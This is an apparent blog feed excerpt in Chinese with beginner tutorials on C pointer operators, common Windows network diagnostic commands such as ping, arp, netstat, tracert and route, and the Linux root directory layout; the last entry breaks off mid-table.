    <title>详解pointer（指针）中的“*”（取值）和“&amp;”（取地址）</title>
    <link href="https://muzibing.github.io/2020/03/30/2020.03.30%EF%BC%88107%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/30/2020.03.30（107）/</id>
    <published>2020-03-29T16:00:00.000Z</published>
    <updated>2020-03-30T14:36:18.116Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/107-1.png" alt></p><p>    今天要好好的解析以下C/C++中的“*”和“&amp;”的区别，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span>* a = &amp;b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a:%d\n"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*a:%d\n"</span>,*a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&amp;a:%d\n"</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*&amp;a:%d\n"</span>,*&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"**&amp;a:%d\n"</span>,**&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&amp;b:%d\n"</span>,&amp;b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*&amp;b:%d\n"</span>,*&amp;b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果以前看到这么多“*”和“&amp;”符号</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/107-1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;    今天要好好的解析以下C/C++中的“*”和“&amp;amp;”的区别，示例代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Windows常用的网络命令（web）</title>
    <link href="https://muzibing.github.io/2020/03/26/2020.03.26%EF%BC%88106%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/26/2020.03.26（106）/</id>
    <published>2020-03-25T16:00:00.000Z</published>
    <updated>2020-05-06T13:44:42.757Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown0x00-ipconfigfont"><a class="markdownIt-Anchor" href="#font-color-brown0x00-ipconfigfont"></a> <font color="brown">0x00 ipconfig</font></h3><p><code>作用</code>：可以使用 ipconfig 命令获得主机配置信息，包括 IP 地址、子网掩码和默认网关</p><p>IPConfig实用程序和它的等价图形用户界面----Windows 95/98中的WinIPCfg可用于显示当前的TCP/IP配置的设置值。这些信息一般用来检验人工配置的TCP/IP设置是否正确。但是，如果我们的计算机和所在的局域网使用了动态主机配置协议（DHCP），这个程序所显示的信息也许更加实用。</p><p><code>IPConfig最常用的选项：</code></p><p>▧  <code>ipconfig</code>：当使用IPConfig时不带任何参数选项，那么它为每个已经配置了的接口显示IP地址、子网掩码和缺省网关值。</p><p>▧  <code>ipconfig /all</code>：当使用all选项时，IPConfig能为DNS和WINS服务器显示它已配置且所要使用的附加信息（如IP地址等），并且显示内置于本地网卡中的物理地址（MAC）。如果IP地址是从DHCP服务器租用的，IPConfig将显示DHCP服务器的IP地址和租用地址预计失效的日期。</p><p>▧  <code>ipconfig /release</code>和<code>ipconfig /renew</code>：这是两个附加选项，只能在向DHCP服务器租用其IP地址的计算机上起作用。如果我们输入ipconfig /release，那么所有接口的租用IP地址便重新交付给DHCP服务器（归还IP地址）。如果我们输入ipconfig /renew，那么本地计算机便设法与DHCP服务器取得联系，并租用一个IP地址。请注意，大多数情况下网卡将被重新赋予和以前所赋予的相同的IP地址。</p><h3 id="font-color-brown0x01-pingfont"><a class="markdownIt-Anchor" href="#font-color-brown0x01-pingfont"></a> <font color="brown">0x01 ping</font></h3><p>Ping是个使用频率极高的实用程序，<code>用于确定本地主机是否能与另一台主机交换（发送与接收）数据报</code>。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。</p><p>如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。</p><p>按照缺省设置，Windows上运行的Ping命令发送4个ICMP回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。</p><p><font color="navy"><strong>1、通过Ping检测网络故障的典型次序</strong></font></p><p>正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障：</p><p>▧ <code>ping 127.0.0.1</code></p><blockquote><p>这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。</p></blockquote><p>▧ <code>ping 本机IP</code></p><blockquote><p>这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。</p></blockquote><p>▧ <code>ping 局域网内其他IP</code></p><blockquote><p>这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。</p></blockquote><p>▧ <code>ping 网关IP</code></p><blockquote><p>这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。</p></blockquote><p>▧ <code>ping 远程IP</code></p><blockquote><p>如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题）</p></blockquote><p>▧ <code>ping localhost</code></p><blockquote><p>localhost是个作系统的网络保留名，它是127.0.0.1的别名，每台计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。</p></blockquote><p>▧ <code>ping www.xxx.com（如www.yesky.com 天极网）</code></p><blockquote><p>对这个域名执行Ping <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。</p><p>如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。</p></blockquote><p><font color="navy"><strong>2、Ping命令的常用参数选项</strong></font></p><p>(您可以使用 Ping 命令的不同选项来指定要使用的数据包大小、要发送多少数据包、是否记录用过的路由、要使用的生存时间 (TTL) 值以及是否设置“不分段”标志。可以键入 ping -? 查看这些选项。)</p><p>▧ <code>ping IP –t</code></p><blockquote><p>连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。</p></blockquote><p>▧ <code>ping IP -l 300</code></p><blockquote><p>指定Ping命令中的数据长度为300字节，而不是缺省的32字节。</p></blockquote><p>▧ <code>ping IP –n</code></p><blockquote><p>执行特定次数的Ping命令。</p></blockquote><p>下例说明如何向 IP 地址 172.16.48.10 发送两个 Ping，每个都是 1,450 字节：<code>C:\&gt;ping -n 2 -l 1450 172.16.48.10</code></p><p>默认情况下，在显示“请求超时”之前，Ping 等待 1,000 毫秒（1 秒）的时间让每个响应返回。如果通过 Ping 探测的远程系统经过长时间延迟的链路，如卫星链路，则响应可能会花更长的时间才能返回。可以使用 -w （等待）选项指定更长时间的超时。</p><h3 id="font-color-brown0x02-arpfont"><a class="markdownIt-Anchor" href="#font-color-brown0x02-arpfont"></a> <font color="brown">0x02 arp</font></h3><p><code>使用 Arp 解决硬件地址问题</code></p><p>ARP是一个重要的TCP/IP协议，并且用于确定对应IP地址的网卡物理地址。实用arp命令，我们能够查看本地计算机或另一台计算机的ARP高速缓存中的当前内容。此外，使用arp命令，也可以用人工方式输入静态的网卡物理/IP地址对，我们可能会使用这种方式为缺省网关和本地服务器等常用主机进行这项作，有助于减少网络上的信息量。</p><p>按照缺省设置，ARP高速缓存中的项目是动态的，每当发送一个指定地点的数据报且高速缓存中不存在当前项目时，ARP便会自动添加该项目。一旦高速缓存的项目被输入，它们就已经开始走向失效状态。例如，在Windows NT/2000网络中，如果输入项目后不进一步使用，物理/IP地址对就会在2至10分钟内失效。因此，如果ARP高速缓存中项目很少或根本没有时，请不要奇怪，通过另一台计算机或路由器的ping命令即可添加。所以，需要通过arp命令查看高速缓存中的内容时，请最好先ping 此台计算机（不能是本机发送ping命令）。</p><p><font color="navy"><strong>ARP常用命令选项：</strong></font></p><p>▧ <code>arp -a或arp –g</code>：用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARP高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。</p><p>▧ <code>arp -a IP</code>：如果我们有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。</p><p>▧ <code>arp -s IP 物理地址</code>：我们可以向ARP高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。</p><p>▧ <code>arp -d IP</code>：使用本命令能够人工删除一个静态项目。</p><p>例如我们在命令提示符下，键入 Arp –a；如果我们使用过 Ping 命令测试并验证从这台计算机到 IP 地址为 10.0.0.99 的主机的连通性，则 ARP 缓存显示以下项：</p><p><code>Interface:10.0.0.1 on interface 0x1</code></p><table><thead><tr><th style="text-align:center">Internet Address</th><th style="text-align:center">Physical Address</th><th style="text-align:center">Type</th></tr></thead><tbody><tr><td style="text-align:center">10.0.0.99</td><td style="text-align:center">00-e0-98-00-7c-dc</td><td style="text-align:center">dynamic</td></tr></tbody></table><p>在此例中，缓存项指出位于 <code>10.0.0.99</code>的远程主机解析成 <code>00-e0-98-00-7c-dc</code>的媒体访问控制地址，它是在远程计算机的网卡硬件中分配的。媒体访问控制地址是计算机用于与网络上远程 TCP/IP 主机物理通讯的地址。</p><p>至此我们可以用ipconfig和ping命令来查看自己的网络配置并判断是否正确、可以用netstat查看别人与我们所建立的连接并找出ICQ使用者所隐藏的IP信息、可以用arp查看网卡的MAC地址。</p><h3 id="font-color-brown0x03-netstatfont"><a class="markdownIt-Anchor" href="#font-color-brown0x03-netstatfont"></a> <font color="brown">0x03 netstat</font></h3><blockquote><p>使用 netstat 显示连接统计，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。</p></blockquote><p>如果我们的计算机有时候接受到的数据报会导致出错数据删除或故障，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么我们就应该使用Netstat查一查为什么会出现这些情况了。</p><p><font color="navy"><strong>1.netstat 的一些常用选项</strong></font></p><p>▧ <code>netstat –s</code>：本选项能够按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。</p><p>▧ <code>netstat –e</code>：本选项用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量）。</p><p>▧ <code>netstat –r</code>：本选项可以显示关于路由表的信息，类似于后面所讲使用route print命令时看到的信息。除了显示有效路由外，还显示当前有效的连接。</p><p>▧ <code>netstat –a</code>：本选项显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请求（LISTENING）的那些连接。</p><p>▧ <code>netstat –n</code>：显示所有已建立的有效连接。</p><p><font color="navy"><strong>2.Netstat的妙用</strong></font></p><p>经常上网的人一般都使用QQ的，不会遇到被一些讨厌的人骚扰，想投诉却又不知从何下手的情况。其实，我们只要知道对方的IP，就可以向他所属的ISP投诉了。但如果对方在设置QQ时选择了不显示IP地址，那我们是无法在信息栏中看到的。我们只需要通过Netstat就可以很方便的做到这一点：当他通过QQ或其他的工具与我们相连时（例如我们给他发一条QQ信息或他给我们发一条信息），我们立刻在DOS命令提示符下输入netstat -n或netstat -a就可以看到对方上网时所用的IP或ISP域名了，甚至连所用Port都完全暴露了。</p><h3 id="font-color-brown0x04-tracertfont"><a class="markdownIt-Anchor" href="#font-color-brown0x04-tracertfont"></a> <font color="brown">0x04 tracert</font></h3><blockquote><p>使用tracert跟踪网络连接。如果有网络连通性问题，可以使用 tracert 命令来检查到达的目标IP地址的路径并记录结果。tracert命令显示用于将数据包从计算机传递到目标位置的一组 IP 路由器，以及每个跃点所需的时间。如果数据包不能传递到目标，tracert命令将显示成功转发数据包的最后一个路由器。当数据报从我们的计算机经过多个网关传送到目的地时，Tracert命令可以用来跟踪数据报使用的路由（路径）。该实用程序跟踪的路径是源计算机到目的地的一条路径，不能保证或认为数据报总遵循这个路径。如果我们的配置使用DNS，那么我们常常会从所产生的应答中得到城市、地址和常见通信公司的名字。Tracert是一个运行得比较慢的命令（如果我们指定的目标地址比较远），每个路由器我们大约需要给它15秒钟。</p></blockquote><p>Tracert的使用很简单，只需要在tracert后面跟一个IP地址或URL，Tracert会进行相应的域名转换的。Tracert 实用程序对于解决大网络问题非常有用，此时可以采取几条路径到达同一个点。</p><p><font color="navy"><strong>tracert 最常见的用法</strong>：</font></p><p>▧ <code>tracert IP address [-d]</code>该命令返回到达 IP 地址所经过的路由器列表。通过使用 -d 选项，将更快地显示路由器路径，因为 tracert 不会尝试解析路径中路由器的名称。</p><blockquote><p>说明：通过向目标发送不同 IP 生存时间 (TTL) 值的“Internet 控制消息协议 (ICMP)”回应数据包，Tracert 诊断程序确定到目标所采取的路由。要求路径上的每个路由器在转发数据包之前至少将数据包上的 TTL 递减 1。数据包上的 TTL 减为 0 时，路由器应该将“ICMP 已超时”的消息发回源系统。Tracert 先发送 TTL 为 1 的回应数据包，并在随后的每次发送过程将 TTL 递增 1，直到目标响应或 TTL 达到最大值，从而确定路由。通过检查中间路由器发回的“ICMP 已超时”的消息确定路由。某些路由器不经询问直接丢弃 TTL 过期的数据包，这在Tracert 实用程序中看不到。 Tracert 命令按顺序打印出返回“ICMP 已超时”消息的路径中的近端路由器接口列表。如果使用 <code>-d</code> 选项，则 Tracert 实用程序不在每个 IP 地址上查询 DNS。</p></blockquote><p>Tracert 命令行选项：Tracert 命令支持多种选项，如下表所示：</p><p><code>tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name</code></p><p><font color="navy"><strong>选项描述：</strong></font></p><ul><li><p>-d 指定不将 IP 地址解析到主机名称。</p></li><li><p>-h maximum_hops 指定跃点数以跟踪到称为 target_name 的主机的路由。</p></li><li><p>-j host-list 指定 Tracert 实用程序数据包所采用路径中的路由器接口列表。</p></li><li><p>-w timeout 等待 timeout 为每次回复所指定的毫秒数。</p></li><li><p>target_name 目标主机的名称或 IP地址。</p></li></ul><h3 id="font-color-brown0x05-routefont"><a class="markdownIt-Anchor" href="#font-color-brown0x05-routefont"></a> <font color="brown">0x05 route</font></h3><blockquote><p>大多数主机一般都是驻留在只连接一台路由器的网段上。由于只有一台路由器，因此不存在使用哪一台路由器将数据报发表到远程计算机上去的问题，该路由器的IP地址可作为该网段上所有计算机的缺省网关来输入。但是，当网络上拥有两个或多个路由器时，我们就不一定想只依赖缺省网关了。实际上我们可能想让我们的某些远程IP地址通过某个特定的路由器来传递，而其他的远程IP则通过另一个路由器来传递。在这种情况下，我们需要相应的路由信息，这些信息储存在路由表中，每个主机和每个路由器都配有自己独一无二的路由表。大多数路由器使用专门的路由协议来交换和动态更新路由器之间的路由表。但在有些情况下，必须人工将项目添加到路由器和主机上的路由表中。Route就是用来显示、人工添加和修改路由表项目的。</p></blockquote><p>一般使用选项：</p><p>▧ <code>route print</code>：本命令用于显示路由表中的当前项目，在单路由器网段上的输出；由于用IP地址配置了网卡，因此所有的这些项目都是自动添加的。</p><p>▧ <code>route add</code>：使用本命令，可以将信路由项目添加给路由表。例如，如果要设定一个到目的网络<code>209.98.32.33</code>的路由，其间要经过5个路由器网段，首先要经过本地网络上的一个路由器，器IP为<code>202.96.123.5</code>，子网掩码为<code>255.255.255.224</code>，那么我们应该输入以下命令：<code>route add 209.98.32.33 mask 255.255.255.224 202.96.123.5 metric 5</code></p><p>▧ <code>route change</code>：我们可以使用本命令来修改数据的传输路由，不过，我们不能使用本命令来改变数据的目的地。下面这个例子可以将数据的路由改到另一个路由器，它采用一条包含3个网段的更直的路径：<code>route add 209.98.32.33 mask 255.255.255.224 202.96.123.250 metric 3</code></p><p>▧ <code>route delete</code>：使用本命令可以从路由表中删除路由。例如：<code>route delete 209.98.32.33</code>。</p><h3 id="font-color-brown0x06-pathpingfont"><a class="markdownIt-Anchor" href="#font-color-brown0x06-pathpingfont"></a> <font color="brown">0x06 pathping</font></h3><p>使用 pathping 测试路由器。pathping 命令是一个路由跟踪工具，它将 ping 和 tracert 命令的功能和这两个工具所不提供的其他信息结合起来。pathping 命令在一段时间内将数据包发送到到达最终目标的路径上的每个路由器，然后基于数据包的计算机结果从每个跃点返回。由于命令显示数据包在任何给定路由器或链接上丢失的程度，因此可以很容易地确定可能导致网络问题的路由器或链接。某些选项是可用的，如下表所示。</p><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">名称</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center">-n</td><td style="text-align:center">Hostnames</td><td style="text-align:center">不将地址解析成主机名</td></tr><tr><td style="text-align:center">-h</td><td style="text-align:center">Maximum hops</td><td style="text-align:center">搜索目标的最大跃点数</td></tr><tr><td style="text-align:center">-g</td><td style="text-align:center">Host-list</td><td style="text-align:center">沿着路由列表释放源路由</td></tr><tr><td style="text-align:center">-p</td><td style="text-align:center">Period</td><td style="text-align:center">在 ping 之间等待的毫秒数</td></tr><tr><td style="text-align:center">-q</td><td style="text-align:center">Num_queries</td><td style="text-align:center">每个跃点的查询数</td></tr><tr><td style="text-align:center">-w</td><td style="text-align:center">Time-out</td><td style="text-align:center">为每次回复所等待的毫秒数</td></tr><tr><td style="text-align:center">-T</td><td style="text-align:center">Layer 2 tag</td><td style="text-align:center">将第 2 层优先级标记</td></tr><tr><td style="text-align:center">-R</td><td style="text-align:center">RSVP isbase Che</td><td style="text-align:center">检查路径中的路由器是否支持“资源保留协议”,允许主机为数据流保留一定量带宽</td></tr></tbody></table><blockquote><p>对于<code>-T</code>:（例如，对于 IEEE 802.1p）连接到数据包并将它发送到路径中的每个网络设备。这有助于标识没有正确配置第 2 层优先级的网络设备。-T 开关用于测试服务质量 (QoS) 连通性。</p><p>对于<code>-R</code>： 开关用于测试服务质量 (QoS) 连通性。</p></blockquote><p><mark>默认的跃点数是 30，并且超时前的默认等待时间是 3 秒。默认时间是 250 毫秒，并且沿着路径对每个路由器进行查询的次数是 100。</mark></p><p><strong>当运行 pathping 时，在测试问题时首先查看路由的结果</strong>。此路径与 tracert 命令所显示的路径相同。然后 pathping 命令对下一个 125 毫秒显示忙消息（此时间根据跃点计数变化）。在此期间，pathping 从以前列出的所有路由器和它们之间的链接之间收集信息。在此期间结束时，它显示测试结果。</p><p>最右边的两栏 This Node/Link Lost/Sent=Pct 和 Address 包含的信息最有用。172.16.87.218（跃点 1）和 192.68.52.1（跃点 2）丢失 13% 的数据包。 所有其他链接工作正常。在跃点 2 和 4 中的路由器也丢失寻址到它们的数据包（如 This Node /Link 栏中所示），但是该丢失不会影响转发的路径。</p><p>对链接显示的丢失率（在最右边的栏中标记为 |）表明沿路径转发丢失的数据包。该丢失表明链接阻塞。对路由器显示的丢失率（通过最右边栏中的 IP 地址显示）表明这些路由器的 CPU 可能超负荷运行。这些阻塞的路由器可能也是端对端问题的一个因素，尤其是在软件路由器转发数据包时。</p><h3 id="font-color-brown0x07-nbtstatfont"><a class="markdownIt-Anchor" href="#font-color-brown0x07-nbtstatfont"></a> <font color="brown">0x07 NBTStat</font></h3><p>使用 nbtstat 命令释放和刷新 NetBIOS 名称。NBTStat（TCP/IP上的NetBIOS统计数据）实用程序用于提供关于NetBIOS的统计数据。运用NetBIOS，我们可以查看本地计算机或远程计算机上的NetBIOS名字表格。</p><p><font color="navy"><strong>常用选项</strong>：</font></p><ul><li><p><code>nbtstat –n</code>：显示寄存在本地的名字和服务程序。</p></li><li><p><code>nbtstat –c</code>：本命令用于显示NetBIOS名字高速缓存的内容。NetBIOS名字高速缓存用于存放与本计算机最近进行通信的其他计算机的NetBIOS名字和IP地址对。</p></li><li><p><code>nbtstat –r</code>：本命令用于清除和重新加载NetBIOS名字高速缓存。</p></li><li><p><code>nbtstat -a IP</code>：通过IP显示另一台计算机的物理地址和名字列表，我们所显示的内容就像对方计算机自己运行nbtstat -n一样。</p></li><li><p><code>nbtstat -s IP</code>：显示实用其IP地址的另一台计算机的NetBIOS连接表。</p></li></ul><p>例如我们在命令提示符下，键入：nbtstat –RR 释放和刷新过程的进度以命令行输出的形式显示。该信息表明当前注册在该计算机的 WINS 中的所有本地 NetBIOS 名称是否已经使用 WINS 服务器释放和续订了注册。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown0x00-ipconfigfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown0x00-ipconfigfont&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;0
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="知识库" scheme="https://muzibing.github.io/tags/%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Linux-根目录详解（二进制）</title>
    <link href="https://muzibing.github.io/2020/03/21/2020.03.21%EF%BC%88105%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/21/2020.03.21（105）/</id>
    <published>2020-03-20T16:00:00.000Z</published>
    <updated>2020-03-30T12:40:11.158Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的，同时根目录也与开机/还原/系统修复等动作有关。因此FHS标准<strong>建议</strong>： <strong>根目录(/)所在分区应该越小越好</strong>，且应用程式所安装的软体最好不要与根目录放在同一个分区内，以保持根目录越小越好。 如此不但效能较佳，根目录所在的文件系统也较不容易发生问题。</p><p>说白了，就是根目录和Windows的C盘一个样</p></blockquote><h3 id="font-color-navy1根目录下各个目录的功能font"><a class="markdownIt-Anchor" href="#font-color-navy1根目录下各个目录的功能font"></a> <font color="navy">1.根目录下各个目录的功能</font></h3><h4 id="详细列表"><a class="markdownIt-Anchor" href="#详细列表"></a> <code>详细列表</code></h4><table><thead><tr><th>目录</th><th>应放置档案内容</th><th>说明</th><th><strong>备注</strong></th></tr></thead><tbody><tr><td>/bin</td><td>系统有很多放置执行档的目录，但/bin比较特殊。因为/bin放置的是在单人维护模式[quest-?]下还能够被操作的指令。在/bin底下的指令可以被root与一般帐号所使用，主要有：cat, <a href="http://hi.baidu.com/haifengjava/blog/item/e540a894c0f36a1bd21b70d1.html" target="_blank" rel="noopener">chmod(修改权限)</a>, chown, date, mv, mkdir, cp, bash等等常用的指令。</td><td>存放普通用户可执行的指令</td><td>即使在单用户模式下也能够执行处理</td></tr><tr><td>/boot</td><td>主要放置开机会使用到的档案，包括Linux核心档案以及开机选单与开机所需设定档等等。 Linux kernel常用的档名为：<strong>vmlinuz</strong> ，如果使用的是grub这个开机管理程式，则还会存在**/boot/grub/**这个目录！</td><td>开机引导目录</td><td>包括Linux内核文件与开机所需要的文件</td></tr><tr><td>/dev</td><td>在Linux系统上，任何装置与周边设备都是以档案的型态存在于这个目录当中。 只要通过存取这个目录下的某个档案，就等于存取某个装置。比要重要的档案有/dev/null, /dev/zero, /dev/tty , /dev/lp*, / dev/hd*, /dev/sd*等等</td><td>设备目录</td><td>所有的硬件设备及周边均放置在这个设备目录中</td></tr><tr><td>/etc</td><td>系统主要的设定档几乎都放置在这个目录内，例如人员的帐号密码档、各种服务的启始档等等。 一般来说，这个目录下的各档案属性是可以让一般使用者查阅的，<strong>但</strong>是只有root有权力修改。 FHS建议不要放置可执行档(binary)在这个目录中。 比较重要的档案有： /etc/inittab, /etc/init.d/, /etc/modprobe.conf, /etc/X11/, /etc/fstab, /etc/sysconfig/等等。 另外，其下重要的目录有：<br>    <strong>/etc/init.d/</strong> ：所有服务的预设启动script都是放在这里的，例如要启动或者关闭iptables的话：『 /etc/init.d/iptables start』、『/etc/init.d/ iptables stop』<br>    <strong>/etc/xinetd.d/</strong> ：这就是所谓的super daemon管理的各项服务的设定档目录。<br>    <strong>/etc/X11/</strong> ：与X Window有关的各种设定档都在这里，尤其是xorg.conf或XF86Config这两个X Server的设定档。</td><td>各种配置文件目录</td><td>大部分配置属性均存放在这里</td></tr><tr><td>/home</td><td>这是系统预设的使用者家目录(home directory)。 在你新增一个一般使用者帐号时，预设的使用者家目录都会规范到这里来。比较重要的是，家目录有两种代号： ~ ：代表当前使用者的家目录，而 ~guest：则代表用户名为guest的家目录！</td><td></td><td></td></tr><tr><td>/lib</td><td>系统的函式库非常的多，而/lib放置的则是在开机时会用到的函式库，以及在/bin或/sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？你可以将他想成是『外挂』，某些指令必须要有这些『外挂』才能够顺利完成程式的执行之意。 <strong>尤其重要</strong>的是/lib/modules/这个目录，因为该目录会放置核心相关的模组(驱动程式)喔！</td><td>开机时常用的动态链接库</td><td>bin及sbin指令也会调用对应的lib库</td></tr><tr><td>/media</td><td>media是『媒体』的英文，顾名思义，这个/media底下放置的就是可移除的装置啦！ 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：/media/floppy, /media/cdrom等等。</td><td>可移除设备挂载目录</td><td>类似软盘 U盘 光盘等临时挂放目录</td></tr><tr><td>/mnt</td><td>如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与/media相同啦！ 只是有了/media之后，这个目录就用来暂时挂载用了</td><td>用户临时挂载其他的文件系统</td><td>额外的设备可挂载在这里,相对临时而言</td></tr><tr><td>/opt</td><td>这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，<strong>以前的Linux系统中，我们还是习惯放置在/usr/local目录下</strong>！</td><td>第三方软件安装目录</td><td>现在习惯性的放置在/usr/local中</td></tr><tr><td>/root</td><td>系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。</td><td>系统管理员主目录</td><td>除root之外,其他用户均放置在/home目录下</td></tr><tr><td>/sbin</td><td>Linux有非常多指令是用来设定系统环境的，这些指令<strong>只有</strong>root才能够利用来『设定』系统，****其他****使用者最多只能用来『查询』而已。放在/sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到/usr/sbin/当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到/usr/local/sbin/当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。</td><td>只有root才能运行的管理指令</td><td>跟bin类似,但只属于root管理员</td></tr><tr><td>/srv</td><td>srv可以视为『service』的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 